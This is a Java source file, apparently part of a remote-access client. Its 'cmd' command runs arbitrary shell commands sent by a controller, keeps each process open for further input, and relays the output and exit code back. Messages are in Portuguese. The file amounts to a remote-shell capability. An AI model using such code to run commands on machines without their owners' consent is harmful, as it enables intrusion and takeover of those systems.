package br.com.introcdc.connect.client.commands.process;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:34
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.FileComponents;
import br.com.introcdc.connect.client.components.ProcessComponents;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class ClientCommandProcess extends ClientCommand {

    public ClientCommandProcess() {
        super("cmd");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite um comando!");
            return;
        }
        new Thread(() -> {
            ProcessComponents.PROCESS++;
            Integer id = ProcessComponents.PROCESS;
            try {
                boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
                String inputInfo = (windows ? "cmd /c " : "") + input;
                File directory = new File(FileComponents.FOLDER);

                ProcessBuilder processBuilder = new ProcessBuilder();
                processBuilder.command(inputInfo.split(" "));
                processBuilder.directory(directory);

                Process process = processBuilder.start();

                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                String line;
                msg("Executando comando: " + inputInfo + " em " + FileComponents.FOLDER + " (#" + id + ")");
                ProcessComponents.PROCESS_MAP.put(id, process);
                ProcessComponents.WRITER_MAP.put(id, new PrintWriter(process.getOutputStream()));
                ProcessComponents.LOG_PROCESS.add(id);
                ProcessComponents.PROCESS_LIST.put(id, inputInfo + " - " + FileComponents.FOLDER);
                while ((line = bufferedReader.readLine()) != null) {
                    if (ProcessComponents.LOG_PROCESS.contains(id)) {
                        msg(line);
                    }
                }

                if (ProcessComponents.LOG_PROCESS.contains(id)) {
                    msg("Erros (se houver):");
                }
                while ((line = errorReader.readLine()) != null) {
                    if (ProcessComponents.LOG_PROCESS.contains(id)) {
                        msg(line);
                    }
                }

                int exitCode = process.waitFor();
                if (ProcessComponents.LOG_PROCESS.contains(id)) {
                    msg("\nComando finalizado com código de saída: " + exitCode);
                }
                ProcessComponents.LOG_PROCESS.remove(id);
                ProcessComponents.PROCESS_MAP.remove(id);
                ProcessComponents.PROCESS_LIST.remove(id);
                ProcessComponents.WRITER_MAP.remove(id);
            } catch (Exception exception) {
                msg("Ocorreu um erro na execução do processo #" + id + " (" + exception.getMessage() + ")");
                exception(exception);
            }
        }).start();
    }

}
